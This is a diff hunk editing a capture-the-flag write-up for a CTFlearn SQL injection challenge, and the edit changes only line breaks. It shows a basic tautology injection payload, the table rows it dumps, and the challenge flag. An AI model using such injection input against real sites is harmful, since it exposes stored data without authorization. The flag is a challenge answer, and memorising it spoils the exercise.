@@ -15,23 +15,23 @@ Step-3: <br>
 You will find no flag even after submitting the above names. Now try basic SQL payloads in the existing database. <br>
 I submitted the input <code> Lucifer' OR ' 1 = 1 </code> and got the following output: <br>
 <code>
-Name: Luke <br>
-Data: I made this problem. <br>
-Name: Alec <br>
-Data: Steam boys. <br>
-Name: Jalen <br>
-Data: Pump that iron fool. <br>
-Name: Eric <br>
-Data: I make cars. <br>
-Name: Sam <br>
-Data: Thinks he knows SQL. <br>
-Name: fl4g__giv3r <br>
-Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} <br>
-Name: snoutpop <br>
-Data: jowls <br>
-Name: Chunbucket <br>
-Data: @datboiiii <br>
+Name: Luke \n
+Data: I made this problem. \n
+Name: Alec \n
+Data: Steam boys. \n
+Name: Jalen \n
+Data: Pump that iron fool. \n
+Name: Eric \n
+Data: I make cars. \n
+Name: Sam \n
+Data: Thinks he knows SQL. \n
+Name: fl4g__giv3r \n
+Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs} \n
+Name: snoutpop \n
+Data: jowls \n
+Name: Chunbucket \n
+Data: @datboiiii \n
 </code>
 
-Step-4:
+Step-4: <br>
 The desired flag <code>CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}</code> can be found in line number 12 of the above output.
